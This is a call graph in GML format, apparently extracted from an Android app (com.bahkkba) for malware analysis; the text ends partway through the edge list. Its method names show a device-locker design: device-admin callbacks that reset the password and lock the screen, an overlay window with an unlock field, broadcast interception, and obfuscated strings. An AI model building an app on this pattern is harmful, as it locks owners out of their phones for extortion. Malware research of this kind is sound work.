graph [
  directed 1
  node [
    id 0
    label "Ladrt/ADRTLogCatReader;-><init>()V [access_flags=public constructor] @ 0x3974"
    external 0
    entrypoint 0
  ]
  node [
    id 1
    label "Ljava/lang/Object;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 2
    label "Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context; Ljava/lang/String;)V [access_flags=public static] @ 0x3990"
    external 0
    entrypoint 0
  ]
  node [
    id 3
    label "Ladrt/ADRTSender;->onContext(Landroid/content/Context; Ljava/lang/String;)V [access_flags=public static] @ 0x2984"
    external 0
    entrypoint 0
  ]
  node [
    id 4
    label "Landroid/content/Context;->getApplicationContext()Landroid/content/Context;"
    external 1
    entrypoint 0
  ]
  node [
    id 5
    label "Ljava/lang/Thread;->start()V"
    external 1
    entrypoint 0
  ]
  node [
    id 6
    label "Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;"
    external 1
    entrypoint 0
  ]
  node [
    id 7
    label "Ljava/lang/Thread;-><init>(Ljava/lang/Runnable; Ljava/lang/String;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 8
    label "Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;"
    external 1
    entrypoint 0
  ]
  node [
    id 9
    label "Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String; I)Landroid/content/pm/PackageInfo;"
    external 1
    entrypoint 0
  ]
  node [
    id 10
    label "Ladrt/ADRTLogCatReader;->run()V [access_flags=public] @ 0x3a54"
    external 0
    entrypoint 0
  ]
  node [
    id 11
    label "Ljava/io/BufferedReader;-><init>(Ljava/io/Reader; I)V"
    external 1
    entrypoint 0
  ]
  node [
    id 12
    label "Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;"
    external 1
    entrypoint 0
  ]
  node [
    id 13
    label "Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 14
    label "Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;"
    external 1
    entrypoint 0
  ]
  node [
    id 15
    label "Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;"
    external 1
    entrypoint 0
  ]
  node [
    id 16
    label "Ljava/io/BufferedReader;->readLine()Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 17
    label "Ladrt/ADRTSender;->sendLogcatLines([Ljava/lang/String;)V [access_flags=public static] @ 0x2b80"
    external 0
    entrypoint 0
  ]
  node [
    id 18
    label "Landroid/content/Intent;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 19
    label "Landroid/content/Intent;->putExtra(Ljava/lang/String; [Ljava/lang/String;)Landroid/content/Intent;"
    external 1
    entrypoint 0
  ]
  node [
    id 20
    label "Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;"
    external 1
    entrypoint 0
  ]
  node [
    id 21
    label "Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 22
    label "Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;"
    external 1
    entrypoint 0
  ]
  node [
    id 23
    label "Ladrt/ADRTSender;-><init>()V [access_flags=public constructor] @ 0x2968"
    external 0
    entrypoint 0
  ]
  node [
    id 24
    label "Ladrt/ADRTSender;->sendBreakpointHit(Ljava/lang/String; Ljava/util/ArrayList; Ljava/util/ArrayList; Ljava/util/ArrayList; Ljava/util/ArrayList; Ljava/util/ArrayList; Ljava/util/ArrayList;)V [access_flags=public static] @ 0x29a8"
    external 0
    entrypoint 0
  ]
  node [
    id 25
    label "Landroid/content/Intent;->putExtra(Ljava/lang/String; Ljava/io/Serializable;)Landroid/content/Intent;"
    external 1
    entrypoint 0
  ]
  node [
    id 26
    label "Landroid/content/Intent;->putExtra(Ljava/lang/String; Ljava/lang/String;)Landroid/content/Intent;"
    external 1
    entrypoint 0
  ]
  node [
    id 27
    label "Ladrt/ADRTSender;->sendConnect(Ljava/lang/String;)V [access_flags=public static] @ 0x2a78"
    external 0
    entrypoint 0
  ]
  node [
    id 28
    label "Ladrt/ADRTSender;->sendFields(Ljava/lang/String; Ljava/lang/String; Ljava/util/ArrayList; Ljava/util/ArrayList; Ljava/util/ArrayList;)V [access_flags=public static] @ 0x2ad8"
    external 0
    entrypoint 0
  ]
  node [
    id 29
    label "Ladrt/ADRTSender;->sendStop(Ljava/lang/String;)V [access_flags=public static] @ 0x2be0"
    external 0
    entrypoint 0
  ]
  node [
    id 30
    label "Lcom/bahkkba/BAH;-><init>()V [access_flags=public constructor] @ 0x370c"
    external 0
    entrypoint 0
  ]
  node [
    id 31
    label "Lcom/bahkkba/BAH;->getString(Ljava/io/InputStream;)Ljava/lang/String; [access_flags=public static] @ 0x3728"
    external 0
    entrypoint 0
  ]
  node [
    id 32
    label "Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;"
    external 1
    entrypoint 0
  ]
  node [
    id 33
    label "Ljava/io/UnsupportedEncodingException;->printStackTrace()V"
    external 1
    entrypoint 0
  ]
  node [
    id 34
    label "Ljava/lang/StringBuffer;->toString()Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 35
    label "Ljava/io/IOException;->printStackTrace()V"
    external 1
    entrypoint 0
  ]
  node [
    id 36
    label "Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 37
    label "Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream; Ljava/lang/String;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 38
    label "Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 39
    label "Lcom/bahkkba/BAH;->getString(Ljava/lang/String;)Ljava/lang/String; [access_flags=public static] @ 0x3800"
    external 0
    entrypoint 0
  ]
  node [
    id 40
    label "Ljava/io/File;-><init>(Ljava/lang/String;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 41
    label "Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 42
    label "Ljava/io/FileNotFoundException;->printStackTrace()V"
    external 1
    entrypoint 0
  ]
  node [
    id 43
    label "Lcom/bahkkba/BuildConfig;-><init>()V [access_flags=public constructor] @ 0x28f8"
    external 0
    entrypoint 0
  ]
  node [
    id 44
    label "Lcom/bahkkba/DU;-><init>()V [access_flags=public constructor] @ 0x259c"
    external 0
    entrypoint 0
  ]
  node [
    id 45
    label "Lcom/bahkkba/DU;-><init>(Ljava/lang/String;)V [access_flags=public constructor] @ 0x25bc"
    external 0
    entrypoint 0
  ]
  node [
    id 46
    label "Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;"
    external 1
    entrypoint 0
  ]
  node [
    id 47
    label "Ljavax/crypto/Cipher;->init(I Ljava/security/Key;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 48
    label "Lcom/bahkkba/DU;->getKey([B)Ljava/security/Key; [access_flags=private] @ 0x270c"
    external 0
    entrypoint 0
  ]
  node [
    id 49
    label "Ljava/lang/Exception;->printStackTrace()V"
    external 1
    entrypoint 0
  ]
  node [
    id 50
    label "Ljava/lang/String;->getBytes()[B"
    external 1
    entrypoint 0
  ]
  node [
    id 51
    label "Ljavax/crypto/spec/SecretKeySpec;-><init>([B Ljava/lang/String;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 52
    label "Lcom/bahkkba/DU;->byteArr2HexStr([B)Ljava/lang/String; [access_flags=public static] @ 0x2668"
    external 0
    entrypoint 0
  ]
  node [
    id 53
    label "Ljava/lang/StringBuffer;->append(C)Ljava/lang/StringBuffer;"
    external 1
    entrypoint 0
  ]
  node [
    id 54
    label "Ljava/lang/Integer;->toString(I I)Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 55
    label "Ljava/lang/StringBuffer;-><init>(I)V"
    external 1
    entrypoint 0
  ]
  node [
    id 56
    label "Lcom/bahkkba/DU;->hexStr2ByteArr(Ljava/lang/String;)[B [access_flags=public static] @ 0x2778"
    external 0
    entrypoint 0
  ]
  node [
    id 57
    label "Ljava/lang/Integer;->parseInt(Ljava/lang/String; I)I"
    external 1
    entrypoint 0
  ]
  node [
    id 58
    label "Ljava/lang/String;-><init>([B I I)V"
    external 1
    entrypoint 0
  ]
  node [
    id 59
    label "Lcom/bahkkba/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String; [access_flags=public] @ 0x2800"
    external 0
    entrypoint 0
  ]
  node [
    id 60
    label "Lcom/bahkkba/DU;->decrypt([B)[B [access_flags=public] @ 0x283c"
    external 0
    entrypoint 0
  ]
  node [
    id 61
    label "Ljava/lang/String;-><init>([B)V"
    external 1
    entrypoint 0
  ]
  node [
    id 62
    label "Ljavax/crypto/Cipher;->doFinal([B)[B"
    external 1
    entrypoint 0
  ]
  node [
    id 63
    label "Lcom/bahkkba/DU;->encrypt(Ljava/lang/String;)Ljava/lang/String; [access_flags=public] @ 0x2864"
    external 0
    entrypoint 0
  ]
  node [
    id 64
    label "Lcom/bahkkba/DU;->encrypt([B)[B [access_flags=public] @ 0x2898"
    external 0
    entrypoint 0
  ]
  node [
    id 65
    label "Lcom/bahkkba/M;-><init>()V [access_flags=public constructor] @ 0x2208"
    external 0
    entrypoint 0
  ]
  node [
    id 66
    label "Landroid/app/Activity;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 67
    label "Lcom/bahkkba/M;->activiteDevice()V [access_flags=private] @ 0x2224"
    external 0
    entrypoint 0
  ]
  node [
    id 68
    label "Ljava/lang/Throwable;->getMessage()Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 69
    label "Landroid/content/Intent;-><init>(Ljava/lang/String;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 70
    label "Landroid/content/Intent;->putExtra(Ljava/lang/String; Landroid/os/Parcelable;)Landroid/content/Intent;"
    external 1
    entrypoint 0
  ]
  node [
    id 71
    label "Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 72
    label "Landroid/content/ComponentName;-><init>(Landroid/content/Context; Ljava/lang/Class;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 73
    label "Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;"
    external 1
    entrypoint 0
  ]
  node [
    id 74
    label "Lcom/bahkkba/M;->startActivityForResult(Landroid/content/Intent; I)V"
    external 1
    entrypoint 0
  ]
  node [
    id 75
    label "Lcom/bahkkba/M;->getsss(Ljava/lang/String;)Ljava/lang/String; [access_flags=public static final] @ 0x22b8"
    external 0
    entrypoint 0
  ]
  node [
    id 76
    label "Ljava/lang/StringBuffer;->reverse()Ljava/lang/StringBuffer;"
    external 1
    entrypoint 0
  ]
  node [
    id 77
    label "Ljava/lang/String;->replaceAll(Ljava/lang/String; Ljava/lang/String;)Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 78
    label "Landroid/util/Base64;->decode(Ljava/lang/String; I)[B"
    external 1
    entrypoint 0
  ]
  node [
    id 79
    label "Ljava/lang/String;->toString()Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 80
    label "Ljava/lang/String;->subSequence(I I)Ljava/lang/CharSequence;"
    external 1
    entrypoint 0
  ]
  node [
    id 81
    label "Ljava/lang/StringBuffer;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 82
    label "Ljava/lang/String;-><init>(Ljava/lang/String;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 83
    label "Landroid/util/Base64;->encode([B I)[B"
    external 1
    entrypoint 0
  ]
  node [
    id 84
    label "Ljava/lang/StringBuffer;->append(Ljava/lang/Object;)Ljava/lang/StringBuffer;"
    external 1
    entrypoint 0
  ]
  node [
    id 85
    label "Lcom/bahkkba/M;->onCreate(Landroid/os/Bundle;)V [access_flags=public] @ 0x248c"
    external 0
    entrypoint 0
  ]
  node [
    id 86
    label "Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 87
    label "Lcom/bahkkba/MyAdmin;-><init>()V [access_flags=public constructor] @ 0x1f74"
    external 0
    entrypoint 0
  ]
  node [
    id 88
    label "Landroid/app/admin/DeviceAdminReceiver;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 89
    label "Lcom/bahkkba/MyAdmin;->onDisableRequested(Landroid/content/Context; Landroid/content/Intent;)Ljava/lang/CharSequence; [access_flags=public] @ 0x1f90"
    external 0
    entrypoint 0
  ]
  node [
    id 90
    label "Landroid/content/Context;->getResources()Landroid/content/res/Resources;"
    external 1
    entrypoint 0
  ]
  node [
    id 91
    label "Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;"
    external 1
    entrypoint 0
  ]
  node [
    id 92
    label "Landroid/app/admin/DevicePolicyManager;->lockNow()V"
    external 1
    entrypoint 0
  ]
  node [
    id 93
    label "Lcom/bahkkba/MyAdmin;->getManager(Landroid/content/Context;)Landroid/app/admin/DevicePolicyManager;"
    external 1
    entrypoint 0
  ]
  node [
    id 94
    label "Landroid/app/admin/DeviceAdminReceiver;->onDisableRequested(Landroid/content/Context; Landroid/content/Intent;)Ljava/lang/CharSequence;"
    external 1
    entrypoint 0
  ]
  node [
    id 95
    label "Landroid/app/admin/DevicePolicyManager;->resetPassword(Ljava/lang/String; I)Z"
    external 1
    entrypoint 0
  ]
  node [
    id 96
    label "Lcom/bahkkba/MyAdmin;->onEnabled(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public] @ 0x2028"
    external 0
    entrypoint 0
  ]
  node [
    id 97
    label "Landroid/app/admin/DeviceAdminReceiver;->onEnabled(Landroid/content/Context; Landroid/content/Intent;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 98
    label "Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;"
    external 1
    entrypoint 0
  ]
  node [
    id 99
    label "Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;"
    external 1
    entrypoint 0
  ]
  node [
    id 100
    label "Landroid/content/Intent;-><init>(Landroid/content/Context; Ljava/lang/Class;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 101
    label "Lcom/bahkkba/MyAdmin;->onPasswordChanged(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public] @ 0x2124"
    external 0
    entrypoint 0
  ]
  node [
    id 102
    label "Landroid/app/admin/DeviceAdminReceiver;->onPasswordChanged(Landroid/content/Context; Landroid/content/Intent;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 103
    label "Lcom/bahkkba/MyAdmin;->onReceive(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public] @ 0x21b8"
    external 0
    entrypoint 0
  ]
  node [
    id 104
    label "Landroid/app/admin/DeviceAdminReceiver;->onReceive(Landroid/content/Context; Landroid/content/Intent;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 105
    label "Landroid/util/Log;->i(Ljava/lang/String; Ljava/lang/String;)I"
    external 1
    entrypoint 0
  ]
  node [
    id 106
    label "Lcom/bahkkba/R$anim;-><init>()V [access_flags=public constructor] @ 0x21ec"
    external 0
    entrypoint 0
  ]
  node [
    id 107
    label "Lcom/bahkkba/R$attr;-><init>()V [access_flags=public constructor] @ 0x2914"
    external 0
    entrypoint 0
  ]
  node [
    id 108
    label "Lcom/bahkkba/R$color;-><init>()V [access_flags=public constructor] @ 0x28dc"
    external 0
    entrypoint 0
  ]
  node [
    id 109
    label "Lcom/bahkkba/R$drawable;-><init>()V [access_flags=public constructor] @ 0x36f0"
    external 0
    entrypoint 0
  ]
  node [
    id 110
    label "Lcom/bahkkba/R$id;-><init>()V [access_flags=public constructor] @ 0x2930"
    external 0
    entrypoint 0
  ]
  node [
    id 111
    label "Lcom/bahkkba/R$layout;-><init>()V [access_flags=public constructor] @ 0x3958"
    external 0
    entrypoint 0
  ]
  node [
    id 112
    label "Lcom/bahkkba/R$raw;-><init>()V [access_flags=public constructor] @ 0x36d4"
    external 0
    entrypoint 0
  ]
  node [
    id 113
    label "Lcom/bahkkba/R$string;-><init>()V [access_flags=public constructor] @ 0x1f58"
    external 0
    entrypoint 0
  ]
  node [
    id 114
    label "Lcom/bahkkba/R$style;-><init>()V [access_flags=public constructor] @ 0x28c0"
    external 0
    entrypoint 0
  ]
  node [
    id 115
    label "Lcom/bahkkba/R$xml;-><init>()V [access_flags=public constructor] @ 0x294c"
    external 0
    entrypoint 0
  ]
  node [
    id 116
    label "Lcom/bahkkba/R;-><init>()V [access_flags=public constructor] @ 0x36b8"
    external 0
    entrypoint 0
  ]
  node [
    id 117
    label "Lcom/bahkkba/bbb;-><init>()V [access_flags=public constructor] @ 0x24c0"
    external 0
    entrypoint 1
  ]
  node [
    id 118
    label "Landroid/content/BroadcastReceiver;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 119
    label "Lcom/bahkkba/bbb;->onReceive(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public] @ 0x24dc"
    external 0
    entrypoint 1
  ]
  node [
    id 120
    label "Landroid/content/Intent;->getAction()Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 121
    label "Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;"
    external 1
    entrypoint 0
  ]
  node [
    id 122
    label "Ljava/lang/String;->equals(Ljava/lang/Object;)Z"
    external 1
    entrypoint 0
  ]
  node [
    id 123
    label "Lcom/bahkkba/bbb;->abortBroadcast()V"
    external 1
    entrypoint 1
  ]
  node [
    id 124
    label "Lcom/bahkkba/s$100000000;-><init>(Lcom/bahkkba/s;)V [access_flags=constructor] @ 0x2c40"
    external 0
    entrypoint 0
  ]
  node [
    id 125
    label "Ljava/lang/Thread;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 126
    label "Lcom/bahkkba/s$100000000;->start()V"
    external 1
    entrypoint 0
  ]
  node [
    id 127
    label "Lcom/bahkkba/s$100000001;-><init>(Lcom/bahkkba/s;)V [access_flags=constructor] @ 0x386c"
    external 0
    entrypoint 0
  ]
  node [
    id 128
    label "Lcom/bahkkba/s$100000001;->onClick(Landroid/view/View;)V [access_flags=public] @ 0x38b0"
    external 0
    entrypoint 0
  ]
  node [
    id 129
    label "Lcom/bahkkba/s;->access$L1000001(Lcom/bahkkba/s;)Landroid/view/WindowManager; [access_flags=static synthetic] @ 0x2cb4"
    external 0
    entrypoint 1
  ]
  node [
    id 130
    label "Landroid/content/SharedPreferences;->getString(Ljava/lang/String; Ljava/lang/String;)Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 131
    label "Lcom/bahkkba/s;->stopSelf()V"
    external 1
    entrypoint 1
  ]
  node [
    id 132
    label "Landroid/text/Editable;->toString()Ljava/lang/String;"
    external 1
    entrypoint 0
  ]
  node [
    id 133
    label "Landroid/view/WindowManager;->removeView(Landroid/view/View;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 134
    label "Lcom/bahkkba/s;->access$L1000002(Lcom/bahkkba/s;)Landroid/view/View; [access_flags=static synthetic] @ 0x2cd0"
    external 0
    entrypoint 1
  ]
  node [
    id 135
    label "Landroid/widget/EditText;->getText()Landroid/text/Editable;"
    external 1
    entrypoint 0
  ]
  node [
    id 136
    label "Lcom/bahkkba/s;-><init>()V [access_flags=public constructor] @ 0x2c98"
    external 0
    entrypoint 1
  ]
  node [
    id 137
    label "Landroid/app/Service;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 138
    label "Lcom/bahkkba/s;->c()V [access_flags=private] @ 0x2d2c"
    external 0
    entrypoint 1
  ]
  node [
    id 139
    label "Landroid/view/LayoutInflater;->from(Landroid/content/Context;)Landroid/view/LayoutInflater;"
    external 1
    entrypoint 0
  ]
  node [
    id 140
    label "Landroid/view/LayoutInflater;->inflate(I Landroid/view/ViewGroup;)Landroid/view/View;"
    external 1
    entrypoint 0
  ]
  node [
    id 141
    label "Lcom/bahkkba/s;->getResources()Landroid/content/res/Resources;"
    external 1
    entrypoint 1
  ]
  node [
    id 142
    label "Landroid/widget/EditText;->setHint(Ljava/lang/CharSequence;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 143
    label "Ljava/lang/StringBuffer;->append(J)Ljava/lang/StringBuffer;"
    external 1
    entrypoint 0
  ]
  node [
    id 144
    label "Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;"
    external 1
    entrypoint 0
  ]
  node [
    id 145
    label "Lcom/bahkkba/s;->getApplication()Landroid/app/Application;"
    external 1
    entrypoint 1
  ]
  node [
    id 146
    label "Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 147
    label "Landroid/view/View;->findViewById(I)Landroid/view/View;"
    external 1
    entrypoint 0
  ]
  node [
    id 148
    label "Landroid/view/WindowManager;->addView(Landroid/view/View; Landroid/view/ViewGroup$LayoutParams;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 149
    label "Landroid/content/SharedPreferences;->getLong(Ljava/lang/String; J)J"
    external 1
    entrypoint 0
  ]
  node [
    id 150
    label "Landroid/view/WindowManager$LayoutParams;-><init>()V"
    external 1
    entrypoint 0
  ]
  node [
    id 151
    label "Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V"
    external 1
    entrypoint 0
  ]
  node [
    id 152
    label "Lcom/bahkkba/s;->is(Landroid/content/Context;)Z [access_flags=public] @ 0x2fd4"
    external 0
    entrypoint 1
  ]
  node [
    id 153
    label "Landroid/net/NetworkInfo;->isAvailable()Z"
    external 1
    entrypoint 0
  ]
  node [
    id 154
    label "Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;"
    external 1
    entrypoint 0
  ]
  node [
    id 155
    label "Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;"
    external 1
    entrypoint 0
  ]
  node [
    id 156
    label "Lcom/bahkkba/s;->onCreate()V [access_flags=public] @ 0x3048"
    external 0
    entrypoint 1
  ]
  node [
    id 157
    label "Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;"
    external 1
    entrypoint 0
  ]
  node [
    id 158
    label "Ljava/lang/String;->indexOf(Ljava/lang/String;)I"
    external 1
    entrypoint 0
  ]
  node [
    id 159
    label "Ljava/lang/Integer;->intValue()I"
    external 1
    entrypoint 0
  ]
  node [
    id 160
    label "Landroid/app/Service;->onCreate()V"
    external 1
    entrypoint 0
  ]
  node [
    id 161
    label "Lcom/bahkkba/s;->getSharedPreferences(Ljava/lang/String; I)Landroid/content/SharedPreferences;"
    external 1
    entrypoint 1
  ]
  node [
    id 162
    label "Landroid/content/SharedPreferences$Editor;->commit()Z"
    external 1
    entrypoint 0
  ]
  node [
    id 163
    label "Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String; Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;"
    external 1
    entrypoint 0
  ]
  node [
    id 164
    label "Ljava/lang/String;->length()I"
    external 1
    entrypoint 0
  ]
  node [
    id 165
    label "Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;"
    external 1
    entrypoint 0
  ]
  node [
    id 166
    label "Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String; J)Landroid/content/SharedPreferences$Editor;"
    external 1
    entrypoint 0
  ]
  node [
    id 167
    label "Ljava/lang/Long;-><init>(J)V"
    external 1
    entrypoint 0
  ]
  node [
    id 168
    label "Ljava/lang/Math;->random()D"
    external 1
    entrypoint 0
  ]
  node [
    id 169
    label "Lcom/bahkkba/s;->getApplicationContext()Landroid/content/Context;"
    external 1
    entrypoint 1
  ]
  node [
    id 170
    label "Ljava/lang/Long;->parseLong(Ljava/lang/String;)J"
    external 1
    entrypoint 0
  ]
  node [
    id 171
    label "Lcom/bahkkba/s;->onStart(Landroid/content/Intent; I)V [access_flags=public] @ 0x368c"
    external 0
    entrypoint 1
  ]
  node [
    id 172
    label "Landroid/app/Service;->onStart(Landroid/content/Intent; I)V"
    external 1
    entrypoint 0
  ]
  edge [
    source 0
    target 1
  ]
  edge [
    source 2
    target 3
  ]
  edge [
    source 2
    target 4
  ]
  edge [
    source 2
    target 5
  ]
  edge [
    source 2
    target 6
  ]
  edge [
    source 2
    target 7
  ]
  edge [
    source 2
    target 0
  ]
  edge [
    source 2
    target 8
  ]
  edge [
    source 2
    target 9
  ]
  edge [
    source 10
    target 11
  ]
  edge [
    source 10
    target 12
  ]
  edge [
    source 10
    target 13
  ]
  edge [
    source 10
    target 14
  ]
  edge [
    source 10
    target 15
  ]
  edge [
    source 10
    target 16
  ]
  edge [
    source 10
    target 17
  ]
  edge [
    source 17
    target 18
  ]
  edge [
    source 17
    target 19
  ]
  edge [
    source 17
    target 20
  ]
  edge [
    source 17
    target 21
  ]
  edge [
    source 17
    target 22
  ]
  edge [
    source 23
    target 1
  ]
  edge [
    source 24
    target 21
  ]
  edge [
    source 24
    target 22
  ]
  edge [
    source 24
    target 25
  ]
  edge [
    source 24
    target 18
  ]
  edge [
    source 24
    target 26
  ]
  edge [
    source 24
    target 20
  ]
  edge [
    source 27
    target 18
  ]
  edge [
    source 27
    target 26
  ]
  edge [
    source 27
    target 20
  ]
  edge [
    source 27
    target 21
  ]
  edge [
    source 27
    target 22
  ]
  edge [
    source 28
    target 21
  ]
  edge [
    source 28
    target 22
  ]
  edge [
    source 28
    target 25
  ]
  edge [
    source 28
    target 18
  ]
  edge [
    source 28
    target 26
  ]
  edge [
    source 28
    target 20
  ]
  edge [
    source 29
    target 18
  ]
  edge [
    source 29
    target 26
  ]
  edge [
    source 29
    target 20
  ]
  edge [
    source 29
    target 21
  ]
  edge [
    source 29
    target 22
  ]
  edge [
    source 30
    target 1
  ]
  edge [
    source 31
    target 16
  ]
  edge [
    source 31
    target 32
  ]
  edge [
    source 31
    target 33
  ]
  edge [
    source 31
    target 34
  ]
  edge [
    source 31
    target 35
  ]
  edge [
    source 31
    target 36
  ]
  edge [
    source 31
    target 37
  ]
  edge [
    source 31
    target 38
  ]
  edge [
    source 39
    target 31
  ]
  edge [
    source 39
    target 40
  ]
  edge [
    source 39
    target 41
  ]
  edge [
    source 39
    target 42
  ]
  edge [
    source 43
    target 1
  ]
  edge [
    source 44
    target 45
  ]
  edge [
    source 45
    target 46
  ]
  edge [
    source 45
    target 47
  ]
  edge [
    source 45
    target 1
  ]
  edge [
    source 45
    target 48
  ]
  edge [
    source 45
    target 49
  ]
  edge [
    source 45
    target 50
  ]
  edge [
    source 48
    target 51
  ]
  edge [
    source 52
    target 53
  ]
  edge [
    source 52
    target 34
  ]
  edge [
    source 52
    target 54
  ]
  edge [
    source 52
    target 32
  ]
  edge [
    source 52
    target 55
  ]
  edge [
    source 56
    target 57
  ]
  edge [
    source 56
    target 58
  ]
  edge [
    source 56
    target 50
  ]
  edge [
    source 59
    target 60
  ]
  edge [
    source 59
    target 61
  ]
  edge [
    source 59
    target 56
  ]
  edge [
    source 60
    target 62
  ]
  edge [
    source 63
    target 50
  ]
  edge [
    source 63
    target 52
  ]
  edge [
    source 63
    target 64
  ]
  edge [
    source 64
    target 62
  ]
  edge [
    source 65
    target 66
  ]
  edge [
    source 67
    target 68
  ]
  edge [
    source 67
    target 69
  ]
  edge [
    source 67
    target 70
  ]
  edge [
    source 67
    target 71
  ]
  edge [
    source 67
    target 72
  ]
  edge [
    source 67
    target 73
  ]
  edge [
    source 67
    target 74
  ]
  edge [
    source 75
    target 50
  ]
  edge [
    source 75
    target 76
  ]
  edge [
    source 75
    target 61
  ]
  edge [
    source 75
    target 38
  ]
  edge [
    source 75
    target 77
  ]
  edge [
    source 75
    target 78
  ]
  edge [
    source 75
    target 32
  ]
  edge [
    source 75
    target 79
  ]
  edge [
    source 75
    target 80
  ]
  edge [
    source 75
    target 81
  ]
  edge [
    source 75
    target 34
  ]
  edge [
    source 75
    target 82
  ]
  edge [
    source 75
    target 83
  ]
  edge [
    source 75
    target 84
  ]
  edge [
    source 85
    target 86
  ]
  edge [
    source 85
    target 2
  ]
  edge [
    source 85
    target 67
  ]
  edge [
    source 87
    target 88
  ]
  edge [
    source 89
    target 77
  ]
  edge [
    source 89
    target 75
  ]
  edge [
    source 89
    target 90
  ]
  edge [
    source 89
    target 31
  ]
  edge [
    source 89
    target 91
  ]
  edge [
    source 89
    target 92
  ]
  edge [
    source 89
    target 93
  ]
  edge [
    source 89
    target 94
  ]
  edge [
    source 89
    target 95
  ]
  edge [
    source 96
    target 77
  ]
  edge [
    source 96
    target 97
  ]
  edge [
    source 96
    target 68
  ]
  edge [
    source 96
    target 31
  ]
  edge [
    source 96
    target 71
  ]
  edge [
    source 96
    target 75
  ]
  edge [
    source 96
    target 90
  ]
  edge [
    source 96
    target 95
  ]
  edge [
    source 96
    target 91
  ]
  edge [
    source 96
    target 93
  ]
  edge [
    source 96
    target 98
  ]
  edge [
    source 96
    target 99
  ]
  edge [
    source 96
    target 100
  ]
  edge [
    source 96
    target 73
  ]
  edge [
    source 101
    target 77
  ]
  edge [
    source 101
    target 75
  ]
  edge [
    source 101
    target 90
  ]
  edge [
    source 101
    target 31
  ]
  edge [
    source 101
    target 91
  ]
  edge [
    source 101
    target 102
  ]
  edge [
    source 101
    target 92
  ]
  edge [
    source 101
    target 93
  ]
  edge [
    source 101
    target 95
  ]
  edge [
    source 103
    target 104
  ]
  edge [
    source 103
    target 105
  ]
  edge [
    source 106
    target 1
  ]
  edge [
    source 107
    target 1
  ]
  edge [
    source 108
    target 1
  ]
  edge [
    source 109
    target 1
  ]
  edge [
    source 110
    target 1
